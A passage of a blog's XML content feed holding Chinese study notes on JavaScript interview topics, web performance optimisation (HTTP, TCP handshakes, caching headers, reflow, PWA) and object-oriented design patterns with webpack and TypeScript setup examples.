500) &#123; fn.apply(this, arguments) start = now &#125; else &#123; timer = setTimeout(() =&gt; &#123; fn.apply(this, arguments) &#125;, 500) &#125; &#125;&#125; js为何是单线程操作 DOM 必然会涉及到资源的竞争引用多线程是为了充分利用硬件资源，但是作为js执行环境的浏览器是客户端的一个进程， 不需要考虑充分利用其硬件资源；多线程带来了编程的复杂性，需要加锁，加锁本身也是消耗性能的 node 性能为何高1、Nodejs与操作系统交互，我们在 Javascript中调用的方法，最终都会通过 process.binding 传递到 C/C++ 层面，最终由他们来执行真正的操作。Node.js 即这样与操作系统进行互动。2、nodejs所谓的单线程，只是主线程是单线程，所有的网络请求或者异步任务都交给了内部的线程池去实现，本身只负责不断的往返调度，由事件循环不断驱动事件执行。3、Nodejs之所以单线程可以处理高并发的原因，得益于libuv层的事件循环机制，和底层线程池实现。4、Event loop就是主线程从主线程的事件队列里面不停循环的读取事件，驱动了所有的异步回调函数的执行，Event loop总共7个阶段，每个阶段都有一个任务队列，当所有阶段被顺序执行一次后，event loop 完成了一个 tick。 Webpack性能优化1、缩小文件的搜索范围resolve字段告诉webpack怎么去搜索文件，所以首先要重视resolve字段的配置设置resolve.modules:[path.resolve(__dirname, ‘node_modules’)]避免层层查找。设置resolve.mainFields:[‘main’]，设置尽量少的值可以减少入口文件的搜索步骤合理配置resolve.extensions，减少文件查找配置loader时，通过test、exclude、include缩小搜索范围module.noParse字段告诉Webpack不必解析哪些文件，可以用来排除对非模块化库文件的解析2、使用DllPlugin减少基础模块编译次数把网页依赖的基础模块抽离出来打包到dll文件中，当需要导入的模块存在于某个dll中时，这个模块不再被打包，而是去dll中获取3、使用HappyPack开启多进程Loader转换4、使用ParallelUglifyPlugin，开启多进程压缩JS文件5、压缩代码 JS、ES、CSS6、使用Tree Shaking剔除JS死代码 new 和 Object.create() new 123456789101112var Fn = function () &#123; &#125;;var obj = new Fn();function _new(Fn) &#123; var obj = &#123;&#125; // new Object() 创建一个空对象 obj.__prototype__ = Fn.prototype // 设置原型链 var ret = Fn.call(obj) // 让Fn的this指向obj，并执行Fn的函数体 if(typeof ret === 'Object') &#123; // 判断Fn的返回值类型，如果是引用类型，就返回这个引用类型的对象; 如果是值类型，返回obj return ret &#125; return obj&#125; Objec.create() 12345678910var o = Object.create(obj, props)Objec.create = function(obj, props) &#123; var Fn = function() &#123;&#125; Fn.prototype = obj if(props) &#123; Object.defineProperties(Fn, props) &#125; return new Fn()&#125; vue 如何监听数组的变化12345678910111213141516var aryMethods = ['push', 'pop', 'shift', 'unshift', 'splice', 'sort', 'reverse'];var arrayAugmentations = Object.create(Array.prototype)aryMethods.forEach((method)=&gt; &#123; var args = slice.call(arguments) var original = Array.prototype[method]; arrayAugmentations[method] = function () &#123; // console.log(`$&#123;method&#125;方法被执行了`) return original.apply(this, args); &#125;;&#125;);var list = ['a', 'b', 'c'];list.__proto__ = arrayAugmentations;list.push('d'); // 我被改变啦！ 4 todo虚拟dom的实现双向绑定vue 插件移动端开发微信公众号 要求前端JS/CSS基础足够扎实HTTP/HTTPS/TCP 等网络协议相关的常见知识点，XSS/CSRF等网络安全常见的知识点要掌握前端的性能优化Webpack的原理，性能优化Vue/React至少能解释其中一个的基本实现原理，能说出他们的主要区别Redux/Vuex至少掌握其中一个的实现原理常见的数据结构和算法，以及他们的时间复杂度，比如手写快排或者DFS如果有后端开发经验、Weex/RN等更好上面这些都是技术的，一般还会问一些团队建设以及业务理解等问题。]]></content>
      <categories>
        <category>Review</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>Review</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web前端性能优化 - 让你的页面飞起来]]></title>
    <url>%2F2019%2F06%2F25%2FWeb%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96-%E8%AE%A9%E4%BD%A0%E7%9A%84%E9%A1%B5%E9%9D%A2%E9%A3%9E%E8%B5%B7%E6%9D%A5%2F</url>
    <content type="text"><![CDATA[从构建、浏览器渲染、缓存、PWA、服务端优化等多方面，梳理前端性能优化的技术点、综合分析技术的原理，根据不同的业务场景选择合适的性能优化点进行应用，最终为你的网站带来显著的速度提升和整体性能提升。 资源合并压缩、图片格式及加载方式的优化CSS和JS的装载与执行重绘与回流浏览器存储PWA，缓存SSR服务端渲染构建层减少资源请求的大小和数量优化浏览器渲染提升动画体验显著提升网站二次访问体验首屏渲染性能优化 基础web 前端本质上是一种 GUI 软件，采用 BS 架构，经历开发到发布到 CDN 或 webserver , 通过 浏览器 http 请求返回资源。 资源合并与压缩关键: 减少 http 请求数量、减少请求资源大小 http 清求的过程深入理解 http 请求过程，是 前端性能优化的核心。 用户在浏览器输入 url -&gt; DNS解析(浏览器未过期缓存、操作系统、hosts文件、首选DNS服务器等) -&gt; 与服务器建立连接，发起TCP的3次握手 –&gt; 发起http请求 –&gt; 服务器响应http请求，浏览器得到html代码 –&gt; 浏览器解析html代码，并请求html代码中的资源 –&gt; 浏览器对页面进行渲染呈现给用户 http 是什么通俗来讲，他就是计算机通过网络进行通信的规则，是一个基于请求与响应，无状态的，应用层的协议，常基于TCP/IP协议传输数据。目前任何终端（手机，笔记本电脑。。）之间进行任何一种通信都必须按照Http协议进行，否则无法连接。 三次握手客户端的请求到达服务器，首先就是建立TCP连接。 第一次握手：客户端发送syn包(syn=j)到服务器，并进入SYN_SEND状态，等待服务器确认；第二次握手：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（syn=k），即SYN+ACK包，此时服务器进入SYN_RECV状态；第三次握手：客户端收到服务器的SYN＋ACK包，向服务器发送确认包ACK(ack=k+1)，此包发送完毕，客户端和服务器进入ESTABLISHED状态，完成三次握手。 为什么要三次握手防止已失效的连接请求报文段突然又传送到了服务端，因而产生错误。解决网络中存在延迟的重复分组的问题，同时防止服务器端的一直等待而浪费资源 TCP四次挥手当客户端和服务器通过三次握手建立了TCP连接以后，当数据传送完毕，肯定是要断开TCP连接的啊。那对于TCP的断开连接，这里就有了神秘的“四次分手”。 第一次分手：主机1（可以使客户端，也可以是服务器端），设置Sequence Number，向主机2发送一个FIN报文段；此时，主机1进入FIN_WAIT_1状态；这表示主机1没有数据要发送给主机2了；第二次分手：主机2收到了主机1发送的FIN报文段，向主机1回一个ACK报文段，Acknowledgment Number为Sequence Number加1；主机1进入FIN_WAIT_2状态；主机2告诉主机1，我“同意”你的关闭请求；第三次分手：主机2向主机1发送FIN报文段，请求关闭连接，同时主机2进入LAST_ACK状态；第四次分手：主机1收到主机2发送的FIN报文段，向主机2发送ACK报文段，然后主机1进入TIME_WAIT状态；主机2收到主机1的ACK报文段以后，就关闭连接；此时，主机1等待2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，主机1也可以关闭连接了。 为什么要四次分手TCP协议是一种面向连接的、可靠的、基于字节流的运输层通信协议。TCP是全双工模式，这就意味着，当主机1发出FIN报文段时，只是表示主机1已经没有数据要发送了，主机1告诉主机2，它的数据已经全部发送完毕了；但是，这个时候主机1还是可以接受来自主机2的数据；当主机2返回ACK报文段时，表示它已经知道主机1没有数据发送了，但是主机2还是可以发送数据到主机1的；当主机2也发送了FIN报文段时，这个时候就表示主机2也没有数据要发送了，就会告诉主机1，我也没有数据要发送了，之后彼此就会愉快的中断这次TCP连接。 为什么HTTP协议要基于TCP来实现TCP是一个端到端的可靠的面向连接的协议，所以HTTP基于传输层TCP协议不用担心数据的传输的各种问题。 具体优化方法内容优化(1)减少HTTP请求数:这条策略是最重要最有效的(2)减少DNS查找(3)避免重定向(4)使用Ajax缓存(5)延迟加载组件,预加载组件(6)减少DOM元素数量:页面中存在大量DOM元素,会导致javascript遍历DOM的效率变慢。(7)最小化iframe的数量：iframes 提供了一个简单的方式把一个网站的内容嵌入到另一个网站中。但其创建速度比其他包括js和css的DOM元素的创建慢了1-2个数量级。(8)避免404：HTTP请求时间消耗是很大的，因此使用HTTP请求来获得一个没有用处的响应（例如404没有找到页面）是完全没有必要的，它只会降低用户体验而不会有一点好处。 html压缩压缩在文本文件中有意义，但在 html 中不显示的字符，如 空格、制表符、换行符，注释。 可以使用在线网站、nodejs提供的 html-minifier、后端模板引擎渲染压缩 css 优化无效代码删除, CSS 代码语义合并(1)将CSS代码放在HTML页面的顶部(2)避免使用CSS表达式(3)使用 link 来代替@import(4)避免使用Filters js 优化(1)将JavaScript脚本放在页面的底部。(2)将JavaScript和CSS作为外部文件来引用：在实际应用中使用外部文件可以提高页面速度，因为JavaScript和CSS文件都能在浏览器中产生缓存。(3)缩小JavaScript，无效字符删除、剔除注释、代码语义合并，可以使用 uglifyjs 压缩。(4)删除重复的脚本(5)最小化DOM的访问：使用JavaScript访问DOM元素比较慢。(6)开发智能的事件处理程序(7)javascript代码注意：谨慎使用with,避免使用eval Function函数,减少作用域链查找。 Cookie优化(1)减小Cookie大小(2)针对Web组件使用域名无关的Cookie 服务器优化(1)使用内容分发网络（CDN）：把网站内容分散到多个、处于不同地域位置的服务器上可以加快下载速度。(2)GZIP压缩(3)设置ETag：ETags（Entity tags，实体标签）是web服务器和浏览器用于判断浏览器缓存中的内容和服务器中的原始内容是否匹配的一种机制。(4)提前刷新缓冲区(5)对Ajax请求使用GET方法(6)避免空的图像src 文件合并使用 keep-alive，公共库合并、不同页面的合并。减少丢包和网络请求延迟。但要适当使用，避免 首屏渲染问题 开启 gzip构建层面在线网站或结合 webpack、fis3 等构建工具，自动化地进行资源的打包和压缩 图片相关的优化雪碧图（csssprits），将多个小图整合成一张大图 不同格式图片常用的业务场景1、JPEG(Joint Photographic Experts Group) 有损压缩，压缩率高，占内存小，不支持透明主要用于摄影作品或者写实作品（或是其他细节、色彩丰富的图片）或大的背景图；对多色彩表现较好；不适于文字较多的图片。在页面中使用的商品图片、采用人像或者实物素材制作的广告Banner等图像更适合采用JPG的图片格式保存。 2、PNG(Portable Network Graphics 便携式网络图片) 无损压缩，体积大，图片质量高，支持透明png8 2^8色，文件较小，支持透明png24 2^24色，不支持透明png32 2^24色，支持透明主要用于小图标或颜色简单对比强烈的小的背景图。页面结构的基本视觉元素，如容器的背景、按钮、导航的背景等应该尽量用PNG格式进行存储，这样才能更好的保证设计品质。 3、GIF(Graphics Interchange Format 图像互换格式) 无损耗性。最多支持256种色彩的图像.布尔透明，可以使全透明，也可是全不透明。支持动画。适合对颜色要求不高的图形（比如说图标、图表等） 4、WEBP 体积小，同时支持有损和无损压缩的、使用直接色的、点阵图，压缩程度更好，在 ios webview 兼容性问题 5、SVG(Scalable Vector Graphics) 矢量图，代码内嵌，相对较小，图片样式相对简单的场景 6、base64 将图片转换为base64编码字符串inline到CSS或页面中，适用于图片小于2KB、页面引用图片不多的情况，减少了http请求，数据就是图片。 7、canvas需要高性能的图片或动画，使用HTML5的canvas元素绘制图片，页面渲染性能较高。 css 和 js 的装载与执行HTML 渲染过程顺序执行、并发加载，每个域名并发度有限2-6，因此设置几个 CDN，或 gzip 压缩 如果使用 HTTP2，可以避开限制CSS head 引入，防止闪动CSS 和 js 都会阻塞 js 的执行，但不会阻塞外部资源的加载，因此可以预加载 懒加载与预加载懒加载: 监听scroll事件，图片进入可视区域，再请求资源，为图片赋上src。预加载: 静态资源在使用之前提前请求，使用时可从缓存中加载1234561、 &lt;img src="" style="display:none"&gt;2、使用 Image 对象var image = new Image();image.src = "http://test.png";3、XMLHttpRequest 能监听数据传输情况，但有跨域问题4、PreloadJS 进阶浏览器渲染Html、JavaScript 和 CSS 在浏览器端的加载机制、重绘与回流渲染树的生成 浏览器如何渲染网页1、使用 HTML 创建文档对象模型（DOM）浏览器从上到下读取标签，把他们分解成节点，从而创建 DOM 。策略：样式在顶部，脚本在底部；最小化和压缩 2、使用 CSS 创建 CSS 对象模型（CSSOM）CSSOM 的构建会阻塞页面的渲染策略：延迟加载 CSS； 只加载需要的样式 3、基于 DOM 和 CSSOM 执行脚本（Scripts）脚本只能等到先前的 CSS 节点构建完成。策略：异步加载脚本，添加 async 属性，可以通知浏览器不要阻塞其余页面的加载，下载脚本处于较低的优先级。一旦下载完成，就可以执行。使用于不影响 DOM 或 CSSOM 的脚本。延迟加载脚本，defer 跟 async 非常相似，不会阻塞页面加载，但会等到 HTML 完成解析后再执行。 4、合并 DOM 和 CSSOM 形成渲染树（Render Tree）一旦所有节点已被解析，DOM 和 CSSOM 准备合并，浏览器便会构建渲染树。如果我们把节点想象成单词，那么对象模型就是句子，渲染树便是整个页面。 5、使用渲染树布局（Layout）所有元素布局阶段需要确定页面上所有元素的大小和位置。 6、渲染（Paint）所有元素最终的渲染阶段，会真正地光栅化屏幕上的像素，把页面呈现给用户。 回流与重绘频繁触发重绘与回流，会导致UI频繁渲染，最终导致js变慢回流必将引起重绘，而重绘不一定会引起回流 回流当render tree中的一部分(或全部)因为元素的规模尺寸，布局，隐藏等改变而需要重新构建。这就称为回流(reflow)。当页面布局和几何属性改变时就需要回流 盒子模型相关：width、height、padding、border、margin、display、border-width、min-height定位属性及浮动：top、right、bottom、left、position、float、clear节点内部文字结构，行内属性：text-align、overflow、line-height、vertical-align、font-weight、white-space、font-size 重绘当render tree中的一些元素需要更新属性，而这些属性只是影响元素的外观，风格，而不会影响布局的，比如background-color。则就叫称为重绘。 外观属性: color、border-style、border-radius、visibility、background、box-shadow、outline 避免重绘回流的两种方法1、属性替代：避免使用触发重绘、回流的css属性2、新建图层：将频繁重绘回流的dom元素单独作为一个独立图层，那么这个dom元素的重绘和回流的影响只会在这个图层中 新建dom的过程1、获取dom后分割为多个图层2、对每个图层的节点计算样式结果（recalculate style-样式重计算）3、为每个节点生成图形和位置（layout-回流和重布局）4、将每个节点绘制填充到图层位图中（paint setup和paint-重绘）5、图层作为纹理上传至gpu6、符合多个图层到页面上生成最终屏幕图像（coposite layers-图层重组） chrome创建图层的条件3D或透视变换（perspective transform）CSS属性，比如transform:translateZ(0);使用加速视频解码的 video节点拥有3D（WebGL）上下文或加速的2D上下文的 canvas 节点混合插件（如Flash）对自己的opacity做CSS动画或使用一个动画webkit变换的元素拥有加速CSS过滤器的元素元素有一个包含复合层的后代节点（一个元素拥有一个子元素，该子元素在自己的层里）元素有一个z-index较低且包含一个复合层的兄弟元素（换句话说就是该元素在复合层上面渲染）video, canvas, will change:transform, overflow-scrolling:touch 优化点总体思路: 避免触发回流、重绘的 CSS 属性，或者 用 只触发重绘不回流；将回流。重绘的影响范围控制在单独的图层之内1、translate 替换 top/left， 后者会触发回流但是translate不会2、opacity 替换 visibility，visibility 会触发重绘但不会触发回流opacity=0，该元素隐藏起来了，但不会改变页面布局，并且，如果该元素已经绑定一些事件，如click事件，那么点击该区域，也能触发点击事件的visibility=hidden，该元素隐藏起来了，不会改变页面布局，但是不会触发该元素已经绑定的事件display=none，把元素隐藏起来，并且会改变页面布局，可以理解成在页面中把该元素删除掉一样 3、不要一条一条修改dom样式，预先定义好class，然后修改dom的className4、可以将dom离线操作，如先display:none(会有一次reflow)，但是接下来的操作都不会重绘，等离线操作结束后，再显示。5、不要把dom节点的属性值放在循环里，当成循环的变量,在循环外面声明一个变量来中转。如offsetWidth/ offsetHeight，有强制刷新回流队列缓存，一定会触发回流6、不要使用table，即使小改动，整个table也会回流7、动画实现速度的选择，选择合适的动画的间隔时间8、对于动画，可新建图层9、使用gpu加速，比如加上transform：translateZ(0); transform：translate3d(0,0,0) 浏览器存储LocalStorage、Cookie、IndexedDB、sessionStorage、 PWA、 Service Worker cookie1、cookie的初衷：因为http请求无状态，所以需要cookie去维持客户端状态。2、cookie的生成方式：http response header中的set-cookie; js中可以通过document.cookie可以读写cookie3、使用: 用于浏览器端和服务器端的交互; 客户端自身数据的存储4、cookie存储数据能力被localStorage替代5、httponly，当前cookie不支持js读写6、cookie中在相关域名下面 cdn的流量损耗。cdn的域名和主站的域名要分开 indexDBindexDB是一种低级API，用于客户端存储大量结构化数据。该api使用索引来实现对该数据的高性能搜索。虽然web storage对于存储少量的数据很有用，但对于存储更大量的结构化数据来说，这种方法很有用。indexDB提供了一个解决方案。为应用创建离线版本。 PWAPWA(progressive web apps)是一种web app新模型，并不是具体指某一种前沿的技术或者某一个单一的知识点，是一个渐进式的web app，是通过一系列新的web特性，配合优秀的ui交互设计，逐步的增强web app的用户体验。1、方向可靠：在没有网络的环境中也能提供基本的页面访问，而不会出现“未连接到互联网”的页面。快速：针对网页渲染及网络数据访问有较好优化。融入（engaging）：应用可以被增加到手机桌面，并且和普通应用一样有全屏、推送等特性。2、检测pwa、检测性能：lighthouse Service Workerservice worker是一个脚本，浏览器独立于当前网页，将其在后台运行，为实现一些不依赖页面或者用户交互的特性打开了一扇大门。在未来这些特性包括推送消息，背景后台同步，geofencing（地理围栏定位），但它将推出的第一个首要特性，就是拦截和处理网络请求的能力，包括以编程方式来管理被缓存的响应。 1、应用使用拦截和处理网络请求的能力，去实现一个离线应用使用service worker在后台运行同时能和页面通信的能力，去实现大规模后台数据的处理 2、查看chrome://serviceworker-internals/、 chrome://inspect/#service-workers 3、注意事项service workers只能在https下才能生成，本地调试能用localhost:80，不能用ip:80 缓存缓存相关的浏览器和服务端能力 expires缓存过期时间，用来指定资源到期的时间，是服务器端的具体的时间点。告诉浏览器在过期时间前浏览器可以直接从浏览器缓存取数据，而无需再次请求。HTTP 1.0协议中的。 如果在Cache-Control响应头设置了 “max-age” 或者 “s-max-age” 指令，那么 Expires 头会被忽略。Expires: Thu, 11 Jul 2019 18:30:00 GMTExpires: 0 , 无效的日期，代表着过去的日期，即该资源已经过期 Cache-Control通用消息头字段，被用于在http请求和响应中，通过指定指令来实现缓存机制。缓存指令是单向的，这意味着在请求中设置的指令，不一定被包含在响应中。HTTP1.1协议中的。 语法：指令不区分大小写，并且具有可选参数，可以用令牌或者带引号的字符串语法。多个指令以逗号分隔。 指令：1、可缓存性public，表明响应可以被任何对象（包括：发送请求的客户端，代理服务器，等等）缓存，即使是通常不可缓存的内容（例如，该响应没有max-age指令或Expires消息头）。private，表明响应只能被单个用户缓存，不能作为共享缓存（即代理服务器不能缓存它）。私有缓存可以缓存响应内容。no-cache，在发布缓存副本之前，强制要求缓存把请求提交给原始服务器进行验证，评估缓存响应的有效性。no-store，禁止一切缓存 2、到期max-age= seconds，设置缓存存储的最大周期，超过这个时间缓存被认为过期(单位秒)。 200 (from memory cache)s-maxage= seconds，覆盖 max-age 或者 Expires 头，但是仅适用于共享缓存(比如各个代理)，私有缓存会忽略它。 304 3、重新验证和重新加载must-revalidate，一旦资源过期（比如已经超过max-age），在成功向原始服务器验证之前，缓存不能用该资源响应后续请求。proxy-revalidate，与must-revalidate作用相同，但它仅适用于共享缓存（例如代理），并被私有缓存忽略。immutable，表示响应正文不会随时间而改变。资源（如果未过期）在服务器上不发生改变，因此客户端不应发送重新验证请求头来检查更新，即使用户显式地刷新页面。 4、其他no-transform，不得对资源进行转换或转变。Content-Encoding、Content-Range、Content-Type等HTTP头不能由代理修改。only-if-cached，表明客户端只接受已缓存的响应，并且不要向原始服务器检查是否有更新的拷贝。 last-modified / if-modified-since基于客户端和服务端协商的备用缓存机制，Last-Modified与Etag类似。不过Last-Modified表示响应资源在服务器最后修改时间而已。需要与cache-control共同使用。 不足:Last-Modified标注的最后修改只能精确到秒级，如果某些文件在1秒钟以内，被修改多次的话，它将不能准确标注文件的修改时间；如果某些文件会被定期生成，当有时内容并没有任何变化，但Last-Modified却改变了，导致文件没法使用缓存；有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形。 Last-Modified: Thu, 11 Jul 2019 18:30:00 GMT , response headerif-modified-since: Thu, 11 Jul 2019 18:30:00 GMT , request header etag / if-none-matchetag 实体标签，文件内容的hash值，服务器生成的一个标记，用来标识返回值是否有变化。需要与cache-control共同使用，优先级比last-modified/ if-modified-since更高etag是服务器自动生成或者由开发者生成的对应资源在服务器端的唯一标识符，能够更加准确的控制缓存。 当第一次发起请求时，服务器生成并会返回一个Etag给前端，并在你第二次发起同一个请求时，客户端会同时发送一个If-None-Match，而它的值就是Etag的值（此处由发起请求的客户端来设置）。然后，服务器会比对这个客服端发送过来的Etag是否与服务器的相同，如果相同，就将If-None-Match的值设为false，返回状态为304，客户端继续使用本地缓存，不解析服务器返回的数据（这种场景服务器也不返回数据），如果不相同，就将If-None-Match的值设为true，返回状态为200，客户端重新解析服务器返回的数据。 etag: “33a64df551425fcc55e4d42a148795d9f25f89d4” , response headerif-none-match: “33a64df551425fcc55e4d42a148795d9f25f89d4” , request header 缓存机制强制缓存优先于协商缓存进行，若强制缓存(Expires和Cache-Control)生效则直接使用缓存 200(from cache)，若不生效则进行协商缓存(Last-Modified / If-Modified-Since和Etag / If-None-Match)，协商缓存由服务器决定是否使用缓存，若协商缓存失效，那么代表该请求的缓存失效，返回200，重新返回资源和缓存标识，再存入浏览器缓存中；生效则返回304，继续使用缓存 服务器SSRServer Side Rendering 解决首屏渲染问题 服务端是 nodejs，客户端复杂运算可以放到服务端，减少前端运算成本。]]></content>
      <categories>
        <category>性能优化</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>性能优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设计模式]]></title>
    <url>%2F2019%2F06%2F15%2FJS%2F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[设计模式设计模式是解决问题的方案，学习现有的设计模式可以做到经验复用。拥有设计模式词汇，在沟通时就能用更少的词汇来讨论，并且不需要了解底层细节。 概述重要性论工程师的设计能力3年工作经验，面试必考设计能力成为项目负责人，设计能力是必要基础从写好代码，到做好设计，设计模式是必经之路 之前：操作DOM / 绑定事件 / 发送请求 –&gt; 之后：面向对象 / 设计模式 / 合理性和扩展性 搭建开发环境初始化npm环境，使用 webpack 和 babel 搭建 ES6 编译环境。安装webpack、webpack-dev-server、babel 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// 初始化，安装依赖npm initnpm i webpack webpack-cli --save-devnpm i webpack-dev-server html-webpack-plugin --save-devnpm i @babel/core @babel/preset-env @babel/polyfill babel-loader ts-loader --save-dev// package.json"scripts": &#123; "test": "echo \"Error: no test specified\" &amp;&amp; exit 1", "dev": "webpack-dev-server --config ./webpack.dev.config.js --mode development"&#125;,"devDependencies": &#123; "@babel/core": "^7.4.5", "@babel/polyfill": "^7.4.4", "@babel/preset-env": "^7.4.5", "babel-loader": "^8.0.6", "html-webpack-plugin": "^3.2.0", "webpack": "^4.33.0", "webpack-cli": "^3.3.2", "webpack-dev-server": "^3.5.1"&#125;,"babel": &#123; "presets": [ "@babel/preset-env" ], "plugins": []&#125; // webpack.dev.config.jsconst path = require('path')const htmlWebpackPlugin = require('html-webpack-plugin')module.exports = &#123; entry: './src/index.js', output: &#123; path: path.resolve(__dirname, './release'), filename: 'bundle.js' &#125;, plugins: [ new htmlWebpackPlugin(&#123; template: './index.html' &#125;) ], devServer: &#123; contentBase: path.join(__dirname, './release'), // 根目录 open: true, // 自动打开浏览器 port: 8001 &#125;&#125; 面向对象配置 typescript 环境npm i typescript ts-loader @babel/plugin-proposal-class-properties –save-dev 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495// package.json&#123; "main": "index.js", "scripts": &#123; "test": "echo \"Error: no test specified\" &amp;&amp; exit 1", "dev": "webpack-dev-server --config ./webpack.dev.config.js --mode development" &#125;, "devDependencies": &#123; "@babel/core": "^7.4.5", "@babel/plugin-proposal-class-properties": "^7.4.4", "@babel/polyfill": "^7.4.4", "@babel/preset-env": "^7.4.5", "babel-loader": "^8.0.6", "html-webpack-plugin": "^3.2.0", "ts-loader": "^6.0.2", "typescript": "^3.5.1", "webpack": "^4.33.0", "webpack-cli": "^3.3.2", "webpack-dev-server": "^3.5.1" &#125;, "babel": &#123; "presets": [ "@babel/preset-env" ], "plugins": [ [ "@babel/plugin-proposal-class-properties", &#123; "loose": true &#125; ] ] &#125;&#125;// tsconfig.json&#123; "compilerOptions": &#123; "module": "commonjs", "noImplicitAny": false, // 在表达式和声明上有隐含的 any类型时报错 "removeComments": true, "preserveConstEnums": true, "sourceMap": true &#125;, "files": [ "src/index.ts" ], "include": [ "src/**/*" ], "exclude": [ "node_modules", "**/*.spec.ts" ]&#125;// webpack.dev.config.jsconst path = require('path')const htmlWebpackPlugin = require('html-webpack-plugin')module.exports = &#123; entry: './src/index.ts', output: &#123; path: __dirname + 'release', filename: 'bundle.js' &#125;, plugins: [ new htmlWebpackPlugin(&#123; template: './index.html' &#125;) ], devServer: &#123; contentBase: path.join(__dirname, './release'), // 根目录 open: true, // 自动打开浏览器 port: 8001 &#125;, module: &#123; rules: [ &#123; test: /\.js?$/, exclude: /node_modules/, use: &#123; loader: 'babel-loader' &#125; &#125;, &#123; test: /\.ts?$/, exclude: /node_modules/, use: &#123; loader: 'ts-loader' &#125; &#125; ] &#125;&#125; 概念类，即模板，通过模板实例化很多对象，和es5的构造函数原理相同,里面放属性和方法对象（实例），通过类可以赋值给很多对象12345678910111213// object-oriented.tsclass Person &#123; constructor(name, age) &#123; this.name = name this.age = age &#125; speak() &#123; alert(`He is $&#123;this.name&#125;, $&#123;this.age&#125; years old.`) &#125;&#125;let Lee = new Person('Lee', 23)Lee.speak() 三要素继承、封装、多态 继承，子类继承父类。继承可将公共方法抽离出来，提高复用，减少冗余，这是软件设计最基础和最高效的方式123456789101112131415161718192021222324// object-oriented.tsclass Person &#123; constructor(name, age) &#123; this.name = name this.age = age &#125; speak() &#123; alert(`He is $&#123;this.name&#125;, $&#123;this.age&#125; years old.`) &#125;&#125;class Student extends Person &#123; constructor(name, age, num) &#123; super(name, age) this.num = num &#125; study() &#123; alert(`$&#123;this.name&#125; study number is $&#123;this.num&#125;`) &#125;&#125;let Lee = new Student('Lee', 19, 3)Lee.speak()Lee.study() 封装，数据的权限和保密。简单来说，将对象里面的某些属性和方法不想让别人看见，有一些是可以开放出去。减少耦合，不该外露的不外露、利于数据、接口的权限管理。 typescript是js的超集具有明显的特征，如public、private、protexted关键字。public 完全开放，默认关键字protectted 受保护的，自己和子类使用private 私有的，不对外开放12345678910111213141516171819202122232425262728293031323334353637// object-oriented.tsclass People &#123; name age protected weight constructor(name,age) &#123; this.name = name this.age = age this.weight = 120 &#125; speak() &#123; alert(`He is $&#123;this.name&#125;, $&#123;this.age&#125; years old`) &#125;&#125;class Students extends People &#123; num private girl constructor(name, age, num) &#123; super(name, age) this.num = num this.girl = 'Lucy' &#125; study() &#123; alert(`$&#123;this.name&#125; study number is $&#123;this.num&#125;`) &#125; getWeight() &#123; alert(`weight is $&#123;this.weight&#125;`) &#125;&#125;let Long = new Students('Long', 21, 3)Long.speak()// console.log(Long.weight) // 使用会报错// console.log(Long.girl) // 使用会报错 多态，同一接口的不同实现。简单来讲就是父类定义一个接口，子类实现不同的功能。保持子类的开放性和灵活性、面向接口编程(不用管子类如何实现，看父类有多少接口)123456789101112131415161718192021222324252627282930313233343536// /object-oriented.tsclass People &#123; name constructor(name) &#123; this.name = name &#125; sayHi() &#123; &#125;&#125;class A extends People &#123; constructor(name) &#123; super(name) &#125; sayHi() &#123; alert(`Hi $&#123;this.name&#125;`) &#125;&#125;class B extends People &#123; constructor(name) &#123; super(name) &#125; sayHi() &#123; alert(`Hello $&#123;this.name&#125;`) &#125;&#125;// a、b使用父类People的sayHi()方法，展示不一样的结果，此为多态let a = new A('a')a.sayHi()let b = new B('b')b.sayHi() 应用举例以jQuery为例1234567891011121314151617181920212223242526272829303132333435// /jQuery.tsclass jQuery &#123; length selector constructor(selector) &#123; let slice = Array.prototype.slice let dom = slice.call(document.querySelectorAll(selector)) let len = dom ? dom.length : 0 for(let i=0; i&lt;len; i++) &#123; this[i] = dom[i] &#125; this.length = len this.selector = selector || '' &#125; append() &#123; &#125; addClass() &#123; &#125;&#125;// fix: Property '$' does not exist on type '&#123;&#125;'(window as any).$ = function(selector) &#123; // 工场模式 return new jQuery(selector)&#125;var $p = $('p')console.log($p)console.log($p.addClass)// fix: Cannot redeclare block-scoped variable 'jQuery'export &#123;&#125; 为什么使用面向对象1、程序的执行离不开顺序、判断、循环操作，即结构化2、面向对象 ——数据结构化3、对于计算机而言，结构化的才是最简单的4、编程应该是 简单&amp;抽象 UML类图Unified Modeling Language 统一建模语言 UML包含很多种图，主要分享类图，掌握泛化（类之间的继承）和关联（类之间的组合或者是引用） 在线工具： https://www.processon.com/ 设计原则何为设计设计，按哪一种思路或者标准来实现功能。功能相同，可以有不同设计方案来实现。伴随着需求增加，设计的作用才能体现出来 设计准则：通过《LINUX/UNIX设计哲学》理解何为设计1、小即是美（一个功能尽量做得小而精）2、让每个程序只做好一件事（小功能组合起来就是一个大功能）3、快速建立原型（先满足用户基本需求，再根据反馈，不断迭代与升级）4、舍弃高效率而取可移植性（效率高不可复用和效率低可复用之间，会选择后者）5、采用纯文本来存储数据，而非二进制6、充分利用软件的杠杆效应（软件复用）7、使用shell脚本来提高杠杆效应和可移植性8、避免强制性的用户界面，系统和用户界面分开（比如linux的服务器界面就是命令行）9、让每个程序都成为过滤器（把数据放大A程序里面处理，结果出来后再放到B程序里面处理，比如在文件夹里面查找文件）, 如 ls | grep .json | wc -l 小准则1、允许用户定制环境（自己可以进行配置）2、尽量使操作系统内核小而轻量化（内核是内核，工具是工具，拆分开）3、使用小写字母并尽量简短（命名规范）4、沉默是金（有结果就输出，没结果保持沉默，比如linux里面查找文件，没找到相对应的文件，就什么都不会显示）5、各部分之和大于整体（以小的个体组成大的整体）6、寻求90%的解决方案（不可能满足所有人，根据二八定律，花20%的成本解决80%的需求） 五大设计原则 SOLID1、S（Single responsibility principle）——单一职责原则一个程序只做好一件事如果功能过于复杂就拆分开，每个部分保持独立 